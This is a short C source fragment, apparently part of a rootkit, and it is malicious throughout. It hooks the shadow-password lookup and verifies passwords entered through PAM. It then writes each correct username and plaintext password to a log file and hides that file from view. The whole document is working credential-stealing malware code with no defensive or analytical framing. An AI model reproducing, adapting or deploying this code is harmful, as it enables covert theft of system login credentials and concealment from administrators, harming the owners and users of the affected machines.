int verify_pass(char *user, char *acc_pass){
    struct spwd *ent;
    char *pass;
    int got_pw;

    hook(CGETSPNAM);
    ent = call(CGETSPNAM, user);
    if(ent == NULL || strlen(ent->sp_pwdp) < 2)
        return 0;

    pass = crypt(acc_pass, ent->sp_pwdp);
    if(pass == NULL) return 0;

    got_pw = !strcmp(pass, ent->sp_pwdp);
    if(got_pw) return 1;

    return 0;
}

void log_auth(pam_handle_t *pamh, char *resp){
    char *user;
    int  got_pw;
    FILE *fp;

    user = get_username(pamh);
    if(user == NULL) return;

    got_pw = verify_pass(user, resp);
    if(!got_pw) return;

    hook(CFOPEN);
    fp = call(CFOPEN, LOG_PATH, "a");
    if(fp == NULL) return;

    fprintf(fp, LOG_FMT, user, resp);
    fclose(fp);

    if(!hidden_path(LOG_PATH))
        hide_path(LOG_PATH);
}